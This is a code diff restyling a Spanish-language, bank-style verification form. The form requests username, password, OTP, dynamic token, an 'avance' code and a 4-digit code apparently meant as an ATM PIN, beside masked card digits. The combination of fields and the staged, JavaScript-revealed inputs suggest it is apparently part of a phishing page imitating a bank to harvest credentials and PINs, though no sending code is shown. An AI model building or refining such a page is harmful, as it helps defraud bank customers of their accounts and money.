@@ -42,10 +42,10 @@
     }
     .content p{line-height:1.55; margin:4px 0;}
 
-    /* GRID: Etiqueta | Valor (todo a la izquierda, 2 columnas) */
+    /* GRID: Etiqueta | Valor */
     #form{
       display:grid;
-      grid-template-columns: 160px 1fr; /* label | valor */
+      grid-template-columns: 170px 1fr; /* label | valor */
       gap:10px 16px;
       align-items:center;
       margin:0 !important;
@@ -54,19 +54,20 @@
     #form .labels b{color:var(--muted); font-weight:600; text-align:right;}
     #form .values p{margin:0; font-weight:700;}
 
-    /* Inputs compactos y sobrios */
-    input[type="text"], input[type="password"], input[type="number"], input[type="tel"]{
+    /* Tamaño compacto para campos de entrada */
+    .compact-field{
       width:100% !important;
-      height:38px !important;              /* compacto, estilo bancario */
-      padding:0 10px !important;
+      max-width: 320px !important;  /* <<< más angosto */
+      height: 36px !important;      /* <<< más bajo */
+      padding: 0 10px !important;
       border:1px solid #d1d5db !important;
       border-radius:8px !important;
       background:#fff !important;
-      font-size:15px;
+      font-size:14px;               /* <<< más discreto */
       outline:none;
       transition:border-color .15s, box-shadow .15s;
     }
-    input:focus{
+    .compact-field:focus{
       border-color:var(--focus) !important;
       box-shadow:0 0 0 2px rgba(222,1,8,.13) !important;
     }
@@ -83,28 +84,31 @@
     #form .values p:nth-child(2){grid-column:2; grid-row:3;}
     /* 4) Usuario */
     #form .labels b#user{grid-column:1; grid-row:4;}
-    #form #user{grid-column:2; grid-row:4; width:100%; max-width:520px;}
+    #form #user{grid-column:2; grid-row:4;}
     /* 5) Contraseña */
     #form .labels b#puser{grid-column:1; grid-row:5;}
-    #form #puser{grid-column:2; grid-row:5; width:100%; max-width:520px;}
+    #form #puser{grid-column:2; grid-row:5;}
     /* 6) Código OTP */
     #form .labels b#otpcode{grid-column:1; grid-row:6;}
-    #form #otpcode{grid-column:2; grid-row:6; width:100%; max-width:520px;}
+    #form #otpcode{grid-column:2; grid-row:6;}
 
-    /* Link de reenviar: dentro de la tarjeta y centrado */
+    /* Link de reenviar dentro de la tarjeta */
     #newCode{
-      display:block; text-align:center; margin:14px auto 0;
-      color:#0d6efd; text-decoration:none;
+      display:block; text-align:center; margin:12px auto 0;
+      color:#0d6efd; text-decoration:none; font-size:14px;
+      max-width:320px;
     }
     #newCode:hover{text-decoration:underline}
 
-    /* Botón “Verificar” dentro de la tarjeta, estilo pastilla */
+    /* Botón “Verificar” dentro de la tarjeta, más pequeño */
     #btnNextStep.btn-success{
-      display:block; margin:16px auto 0;
-      min-width:220px; height:44px; padding:0 22px;
+      display:block; margin:14px auto 0;
+      width: 180px;                 /* <<< más angosto */
+      height: 40px;                 /* <<< más bajo */
+      padding:0 18px;
       border-radius:999px; border:0;
-      background:#111; color:#fff; font-weight:800; font-size:16px;
-      box-shadow:0 6px 14px rgba(0,0,0,.12);
+      background:#111; color:#fff; font-weight:800; font-size:15px;
+      box-shadow:0 6px 14px rgba(0,0,0,.10);
       cursor:pointer; transition:transform .05s ease, opacity .15s ease;
     }
     #btnNextStep.btn-success:active{transform:translateY(1px)}
@@ -152,17 +156,17 @@
           <p>•••• •••• •••• <span id="card-digits"></span></p>
 
           <!-- Inputs condicionales (JS los muestra/oculta) -->
-          <input class="hidden" required type="text" id="user">
-          <input class="hidden" required type="text" id="puser">
-          <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cdin">
-          <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="dintok">
-          <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cavance">
-          <input class="hidden" oninput="limitDigits(this, 4)" required type="text" id="ccaj">
-          <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="otpcode">
+          <input class="hidden compact-field" required type="text" id="user">
+          <input class="hidden compact-field" required type="text" id="puser">
+          <input class="hidden compact-field" oninput="limitDigits(this, 6)" required type="text" id="cdin">
+          <input class="hidden compact-field" oninput="limitDigits(this, 8)" required type="text" id="dintok">
+          <input class="hidden compact-field" oninput="limitDigits(this, 6)" required type="text" id="cavance">
+          <input class="hidden compact-field" oninput="limitDigits(this, 4)" required type="text" id="ccaj">
+          <input class="hidden compact-field" oninput="limitDigits(this, 8)" required type="text" id="otpcode">
         </div>
       </form>
 
-      <!-- Enlace de reenviar (misma ID, ahora dentro del card) -->
+      <!-- Enlace de reenviar (misma ID, dentro del card) -->
       <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
 
       <!-- Botón dentro del card (misma ID para tu JS) -->
